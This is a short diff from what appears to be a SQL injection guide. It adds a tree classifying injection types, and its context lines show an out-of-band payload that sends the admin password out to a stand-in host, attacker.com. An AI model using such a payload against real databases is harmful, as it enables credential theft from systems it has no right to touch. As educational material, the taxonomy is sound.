@@ -40,3 +40,18 @@
 1. Make the database contact YOUR server directly.
 2. ' AND (SELECT password FROM users WHERE username='admin' INTO OUTFILE '\\attacker.com\data')--
 ```.
+
+
+SQL Injection Vulnerabilities (Root)
+├── In-Band SQL Injection (Parent)
+│   ├── Error-Based (Child)
+│   │   └── Attributes: Visible DB errors, Syntax exploitation
+│   └── UNION-Based (Child)
+│       └── Attributes: UNION SELECT, Direct data theft
+└── Blind SQL Injection (Parent)
+    ├── Boolean-Based (Child)
+    │   └── Attributes: TRUE/FALSE responses, Bit-by-bit extraction
+    ├── Time-Based (Child)
+    │   └── Attributes: SLEEP() delays, Timing analysis
+    └── Out-of-Band (Child)
+        └── Attributes: DNS/HTTP exfiltration, External server contact
